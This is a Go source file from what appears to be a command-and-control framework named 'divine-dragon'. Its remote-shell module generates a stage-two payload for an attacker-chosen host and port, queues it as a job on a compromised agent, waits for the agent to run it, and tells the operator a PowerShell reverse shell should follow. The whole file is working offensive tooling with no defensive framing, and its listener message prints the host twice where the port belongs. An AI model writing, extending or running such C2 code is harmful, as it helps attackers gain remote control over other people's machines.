package remote_access

import (
	"divine-dragon/c2"
	"divine-dragon/payload_generator"
	"divine-dragon/util"
	"time"
)

type RemoteShellModule struct {
	c2m            *c2.C2Module
	agentUuid      string
	host           string
	port           string
	payloadType    string
	platform       string
	arch           string
	executableName string

	logger util.Logger
}

func NewRemoteShellModule(c2mOpt *c2.C2Module, agentUuidOpt string, hostOpt string, portOpt string, payloadTypeOpt string, platformOpt string, archOpt string, executableNameOpt string) *RemoteShellModule {
	rsm := RemoteShellModule{
		c2m:            c2mOpt,
		agentUuid:      agentUuidOpt,
		host:           hostOpt,
		port:           portOpt,
		payloadType:    payloadTypeOpt,
		platform:       platformOpt,
		arch:           archOpt,
		executableName: executableNameOpt,
	}
	rsm.logger = util.RemoteShellLogger(true, "")
	return &rsm
}

func (rsm *RemoteShellModule) Run() {
	rsm.logger.Log.Infof("Don't forget to start a listener on %s:%s. If you're using reverse shell...", rsm.host, rsm.host)
	rsm.logger.Log.Info("Generating a shell payload...")
	stpgm := payload_generator.NewStageTwoPayloadGeneratorModule(rsm.host, rsm.port, rsm.payloadType, rsm.platform, rsm.arch, rsm.executableName)
	stpgm.Run()

	jobUuid, err := rsm.c2m.AddJob(rsm.agentUuid, rsm.executableName)
	if err != nil {
		rsm.logger.Log.Error(err)
		return
	}
	rsm.logger.Log.Info("Waiting for an agent to execute a job...")
	var jobs []string
	var statuses map[string]bool
	var results map[string]string
	jobNotFound := true
	for jobNotFound {
		jobs, statuses, results = rsm.c2m.GetAllAgentJobs(rsm.agentUuid)
		for _, job := range jobs {
			if jobUuid == job && len(results[jobUuid]) > 0 {
				jobNotFound = false
			}
		}
		time.Sleep(time.Second * 1)
	}
	if !statuses[jobUuid] {
		rsm.logger.Log.Info("Job wasn't executed as planned. Stopping...")
		return
	} else {
		rsm.logger.Log.Info("Job's completed. You supposed to be getting a PS reverse shell.")
	}
}
